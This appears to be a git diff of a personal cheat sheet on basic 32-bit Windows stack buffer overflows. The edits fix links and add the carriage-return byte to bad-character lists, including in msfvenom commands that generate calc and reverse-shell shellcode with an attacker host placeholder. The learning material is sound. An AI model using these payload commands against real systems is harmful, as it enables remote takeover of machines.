@@ -1,8 +1,8 @@
 # 32bit Shellcode Based Buffer Overflow
 These are my notes for a basic 32bit buffer overflow with shellcode. It is based on windows but a lot is transferrable to linux too. I am aware that this guide is by no means perfect, it is just my take on what a basic buffer overflow encompasses. I have linked some good writeups below that helped me on my way when learning this simple attack.
 
-[Nightmare][https://guyinatuxedo.github.io/index.html] is a great github repository, it is essentially a zero to hero guide in reverse engineering and binary exploitation.
-[DoStackBufferOverFlowGood][https://github.com/justinsteven/dostackbufferoverflowgood] is what inspried me to make this cheat sheet. Goes into much greater detail about the attack and how it works.
+[Nightmare](https://guyinatuxedo.github.io/index.html) is a great github repository, it is essentially a zero to hero guide in reverse engineering and binary exploitation.
+[DoStackBufferOverFlowGood](https://github.com/justinsteven/dostackbufferoverflowgood) is what inspried me to make this cheat sheet. Goes into much greater detail about the attack and how it works.
 
 This cheat sheet assumes that the binary doesn't have ASLR or NX enabled, meaning you can simply ret to a `jmp esp` instruction and execute shellcode from there.
 
@@ -11,7 +11,7 @@ To keep it simple, the steps of this attack are as follows:
 1. [Fuzzing](#fuzzing)
 	- [Generating cyclic patterns](#generating-cyclic-patterns)
 	- [Finding the offset](#finding-the-offset)
-2. [Finding bad characters](#bad-characters) (commonly 0x00 and 0x0A)
+2. [Finding bad characters](#bad-characters) (commonly 0x00, 0x0A and 0X0D)
 	- [Generating all characters](#generating-all-characters)
 	- [Looking at memory](#looking-at-memory)
 3. [Locating jmp esp](#locating-jmp-esp)
@@ -112,7 +112,7 @@ This command will search memory for cyclic patterns and read you the value in ei
 ## Bad Characters
 One of the most crucial steps when working on buffer overflows is checking for bad characters.  
 Bad characters are characters that the binary will treat differently to others, and can either change the functionality or even completely truncate your payload, rendering it useless.
-The most common are 0x00 and 0x0a, (null byte and newline), this is because many buffer overflows rely on input from stdin and most c functions that take input from stdin use either 0x00 or 0x0a to detect the end of an input.
+The most common are 0x00, 0x0a and 0x0d (null byte, newline and carriage return). This is because many buffer overflows rely on input from stdin and most c functions that take input from stdin use either 0x00 or 0x0a to detect the end of an input.
 However each binary will have it's own for you to discover.
 
 The easiest way to check for bad characters is sending every character to the application and using a debugger such as Immunity Debugger to check for changes to the sent payload in memory. The first step of course is to generate
@@ -195,12 +195,12 @@ metasm > quit
 
 **pop calc**
 ```bash
-msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
+msfvenom -p windows/exec -b '\x00\x0A\x0D' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
 ```
 
 **reverse shell**
 ```bash
-msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellcode_shell LHOST="IPHERE" LPORT=4444 EXITFUNC=thread
+msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A\x0D' -f python --var-name shellcode_shell LHOST="IPHERE" LPORT=4444 EXITFUNC=thread
 ```
 
 ## Getting Reverse Shell
